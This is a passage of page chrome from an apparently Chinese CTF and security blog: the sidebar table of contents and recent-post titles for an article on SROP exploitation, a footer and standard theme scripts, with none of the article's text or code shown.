+</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">25</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" href="https://yanami-sec.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="tencent://message/?uin=1334258945" target="_blank" title="QQ"><i class="fab fa-qq" style="color: #12B7F5;"></i></a><a class="social-icon" href="/img/wechat.jpg" target="_blank" title="微信"><i class="fab fa-weixin" style="color: #07C160;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to Yanami Security Lab.
+Cyber Security · CTF · AI · Research
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E7%90%86%E8%A7%A3-Linux-%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86%E4%BF%A1%E5%8F%B7"><span class="toc-number">1.</span> <span class="toc-text">先理解 Linux 如何处理信号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%99%E5%8F%AF%E4%BB%A5%E6%8E%A7%E5%88%B6%E5%AF%84%E5%AD%98%E5%99%A8%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">为什么这可以控制寄存器？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E5%92%8C%E6%99%AE%E9%80%9A%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.</span> <span class="toc-text">系统调用和普通函数调用的区别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SROP-%E5%88%A9%E7%94%A8%E9%80%9A%E5%B8%B8%E9%9C%80%E8%A6%81%E4%BB%80%E4%B9%88"><span class="toc-number">4.</span> <span class="toc-text">SROP 利用通常需要什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8-SROP-%E5%81%9A%E4%B8%80%E6%AC%A1-ORW"><span class="toc-number">5.</span> <span class="toc-text">用 SROP 做一次 ORW</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SigreturnFrame-%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">6.</span> <span class="toc-text">SigreturnFrame 是什么</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%88%E8%AE%B0%E4%BD%8F%E8%BF%99%E6%9D%A1%E4%B8%BB%E7%BA%BF"><span class="toc-number">7.</span> <span class="toc-text">先记住这条主线</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%BA%90%E7%A0%81"><span class="toc-number">8.</span> <span class="toc-text">题目源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E8%BF%90%E8%A1%8C"><span class="toc-number">9.</span> <span class="toc-text">编译运行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A6%81%E6%9E%84%E9%80%A0%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">10.</span> <span class="toc-text">要构造的执行流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC%E9%AA%A8%E6%9E%B6"><span class="toc-number">11.</span> <span class="toc-text">利用脚本骨架</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%94%A8-SROP-%E8%87%AA%E5%B7%B1%E5%86%99%E5%85%A5-bin-sh-%E5%B9%B6%E8%B0%83%E7%94%A8-execve"><span class="toc-number">12.</span> <span class="toc-text">用 SROP 自己写入 &#x2F;bin&#x2F;sh 并调用 execve</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%A8%8B%E5%BA%8F"><span class="toc-number">12.1.</span> <span class="toc-text">漏洞程序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E4%B8%A4%E4%BB%BD-SROP-frame"><span class="toc-number">12.2.</span> <span class="toc-text">为什么需要两份 SROP frame</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E9%98%B6%E6%AE%B5%EF%BC%9A%E6%8A%8A-bin-sh-%E5%86%99%E5%88%B0-BSS"><span class="toc-number">12.3.</span> <span class="toc-text">第一阶段：把 &#x2F;bin&#x2F;sh 写到 BSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">12.4.</span> <span class="toc-text">完整利用脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E4%BB%BD-payload-%E7%9A%84%E6%A0%88%E5%B8%83%E5%B1%80"><span class="toc-number">12.5.</span> <span class="toc-text">第一份 payload 的栈布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88-frame-rsp-%E4%B9%9F%E8%A6%81%E8%AE%BE%E7%BD%AE"><span class="toc-number">12.6.</span> <span class="toc-text">为什么 frame.rsp 也要设置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%A1%E6%9C%89jmp-main%E6%80%8E%E4%B9%88%E5%8A%9E"><span class="toc-number">12.7.</span> <span class="toc-text">没有jmp main怎么办</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2026/10/08/SROP%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%AE%9E%E6%88%98/" title="SROP 基础及实战"><img src="/img/yanami16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SROP 基础及实战"/></a><div class="content"><a class="title" href="/2026/10/08/SROP%E5%9F%BA%E7%A1%80%E5%8F%8A%E5%AE%9E%E6%88%98/" title="SROP 基础及实战">SROP 基础及实战</a><time datetime="2026-10-08T01:37:44.000Z" title="发表于 2026-10-08 09:37:44">2026-10-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/" title="ORW 入门：用 ROP 打开、读取并输出文件"><img src="/img/yanami15.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ORW 入门：用 ROP 打开、读取并输出文件"/></a><div class="content"><a class="title" href="/2026/10/07/ORW%20%E5%85%A5%E9%97%A8%EF%BC%9A%E7%94%A8%20ROP%20%E6%89%93%E5%BC%80%E3%80%81%E8%AF%BB%E5%8F%96%E5%B9%B6%E8%BE%93%E5%87%BA%E6%96%87%E4%BB%B6/" title="ORW 入门：用 ROP 打开、读取并输出文件">ORW 入门：用 ROP 打开、读取并输出文件</a><time datetime="2026-10-07T11:27:17.000Z" title="发表于 2026-10-07 19:27:17">2026-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/07/PIE%20%E5%BC%80%E5%90%AF%E4%B8%8B%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%EF%BC%9A%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80%E5%B9%B6%E5%8A%AB%E6%8C%81%20GOT/" title="PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT"><img src="/img/yanami14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT"/></a><div class="content"><a class="title" href="/2026/10/07/PIE%20%E5%BC%80%E5%90%AF%E4%B8%8B%E7%9A%84%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%A9%E7%94%A8%EF%BC%9A%E6%B3%84%E9%9C%B2%E5%9F%BA%E5%9D%80%E5%B9%B6%E5%8A%AB%E6%8C%81%20GOT/" title="PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT">PIE 开启下的格式化字符串利用：泄露基址并劫持 GOT</a><time datetime="2026-10-07T02:20:48.000Z" title="发表于 2026-10-07 10:20:48">2026-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E6%88%98%EF%BC%9A%E8%A6%86%E7%9B%96%20exit@got%20%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/" title="格式化字符串实战：覆盖 exit@got 劫持程序流程"><img src="/img/yanami13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串实战：覆盖 exit@got 劫持程序流程"/></a><div class="content"><a class="title" href="/2026/10/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%AE%9E%E6%88%98%EF%BC%9A%E8%A6%86%E7%9B%96%20exit@got%20%E5%8A%AB%E6%8C%81%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B/" title="格式化字符串实战：覆盖 exit@got 劫持程序流程">格式化字符串实战：覆盖 exit@got 劫持程序流程</a><time datetime="2026-10-06T08:34:20.000Z" title="发表于 2026-10-06 16:34:20">2026-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/10/06/format-string-got-write/" title="格式化字符串任意地址写：利用 %n 修改 GOT"><img src="/img/yanami12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="格式化字符串任意地址写：利用 %n 修改 GOT"/></a><div class="content"><a class="title" href="/2026/10/06/format-string-got-write/" title="格式化字符串任意地址写：利用 %n 修改 GOT">格式化字符串任意地址写：利用 %n 修改 GOT</a><time datetime="2026-10-06T05:56:15.000Z" title="发表于 2026-10-06 13:56:15">2026-10-06</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2026 By Anna Yanami</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.7.0"></script><script src="/js/main.js?v=5.7.0"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><div class="js-pjax"></div><script src="/js/custom.js"></script><script src="https://cdn.jsdelivr.net/npm/pangu@7.2.0/dist/browser/pangu.umd.js"></script><script src="/js/runtime.js"></script><script> const initPangu = () => { if (typeof pangu !== 'undefined') { pangu.spacingPage(); } }; document.addEventListener('DOMContentLoaded', initPangu); document.addEventListener('pjax:complete', initPangu); </script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
